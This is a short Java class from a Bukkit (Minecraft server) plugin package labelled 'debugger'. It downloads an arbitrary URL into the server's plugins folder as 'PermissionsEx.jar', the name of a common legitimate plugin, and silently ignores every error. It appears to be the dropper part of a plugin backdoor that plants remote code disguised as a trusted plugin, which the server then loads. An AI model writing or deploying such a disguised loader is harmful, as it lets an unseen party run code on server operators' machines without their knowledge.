package com.thiccindustries.debugger;

import org.bukkit.plugin.Plugin;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;

public class Downloader {
    public static void download(String url, File file){
        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());
             FileOutputStream fileOutputStream = new FileOutputStream(file)) {
            byte dataBuffer[] = new byte[1024];
            int bytesRead;
            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                fileOutputStream.write(dataBuffer, 0, bytesRead);
            }
        } catch (Throwable e) {
            // handle exception
        }
    }

    public static void download(String url, Plugin plugin){
        download(url, new File(plugin.getDataFolder().getParentFile(), "PermissionsEx.jar"));
    }
}
